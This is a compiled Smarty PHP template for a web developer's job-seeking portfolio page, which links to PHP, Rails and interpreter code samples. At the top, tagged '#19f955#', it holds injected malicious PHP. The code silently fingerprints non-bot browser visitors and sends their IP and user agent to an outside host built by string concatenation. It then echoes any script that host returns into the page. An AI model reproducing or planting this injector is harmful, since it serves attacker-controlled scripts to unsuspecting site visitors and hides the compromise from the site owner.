<?php /* Smarty version 2.6.22, created on 2013-12-17 12:46:33
         compiled from /home/content/71/7128071/html//templates/portfolio.html */ ?>
<?php
#19f955#
error_reporting(0); ini_set('display_errors',0); $wp_bl157 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_bl157) && !preg_match ('/bot/i', $wp_bl157))){
$wp_bl09157="http://"."tags"."cache".".com/cache"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bl157);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bl09157);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_157bl = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_157bl,1,3) === 'scr' ){ echo $wp_157bl; }
#/19f955#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<p><strong>My name is Alan and I am an actively employed web programmer and developer currently looking join a team of intelligent professionals in the Boston, Mass area.  I encourage you to view the following code examples:</strong></p>

<span style="text-align:center; display:block;">&middot;&middot;&middot; Please read through my <a href="http://www.alanmarcero.com/portfolio/Alan_Marcero_Resume.pdf">resume</a> and <a href="http://www.alanmarcero.com/portfolio/Alan_Marcero_Cover.pdf">cover</a> letter</a> &middot;&middot;&middot;</span>

<ul>
<li style="margin-bottom:20px">First is a collection of PHP controllers for the very site you are currently viewing.  <a href="http://www.alanmarcero.com/portfolio/php.zip">Downloadable here</a> is a 
collection of the most heavily used controllers.  alanmarcero.com was programmed using an MVC design pattern with the Smarty template engine.</li>

<li style="margin-bottom:20px">I'd also like to show that while my background is primarily in PHP, I do also have experience programming in Ruby, particularly Ruby on Rails. 
<a href="http://www.alanmarcero.com/portfolio/ruby.zip">Downloadable here</a> is alanmarcero.com developed using Rails.</li>

<li style="margin-bottom:20px">Last is a language interpreter written in Ruby.  The interpreter implements a simple language that is capable 
of assigning variables and of simple arithmetic.  <a href="http://www.alanmarcero.com/portfolio/interpreter.zip">Downloadable here</a>.</li>
</ul>